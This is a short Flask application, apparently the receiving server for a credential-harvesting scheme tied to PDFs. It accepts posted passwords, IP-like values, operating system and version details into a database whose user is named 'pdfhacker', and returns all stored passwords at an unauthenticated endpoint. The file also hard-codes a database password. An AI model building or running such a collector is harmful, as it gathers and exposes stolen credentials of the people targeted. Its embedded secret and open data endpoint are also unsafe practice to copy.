# app.py
from flask import Flask, request, jsonify
import mysql.connector

app = Flask(__name__)

mydb = mysql.connector.connect(
  host="localhost",
  user="pdfhacker",
  password="ITKBWiCFedvha3nv9wzx",
  database="pdfdatos"
)


print(mydb)

@app.route("/grida", methods=["GET","POST"])

def get_data():
    mycursor = mydb.cursor()
    mycursor.execute("SELECT * FROM datos")
    myresult = mycursor.fetchall()
    payload = []
    content = {}
    for result in myresult:
        content = {'id':result[4],'contrasenia': result[0], 'dip': result[1], 'so': result[2], 'version': result[3]}
        payload.append(content)
        content = {}
    print(payload)
    return jsonify(payload)

@app.route('/api/load', methods=["GET","POST"])
def post_datos():
    json_data = request.get_data(as_text=True).strip().split("&")
    print(json_data)
    dip = json_data[0].split("=")[1]
    print(dip)
    psw= json_data[1].split("=")[1]
    print(psw)
    so = json_data[2].split("=")[1]
    print(so)
    ver = json_data[3].split("=")[1]
    print(ver)
    mycursor = mydb.cursor()
    mycursor.execute("INSERT INTO datos(contraseña, dip, so, version) VALUES (%s,%s,%s,%s);"
    , (psw,dip,so,ver))
    mydb.commit()
    mycursor.close()
    return '200 Ingreso exitoso'

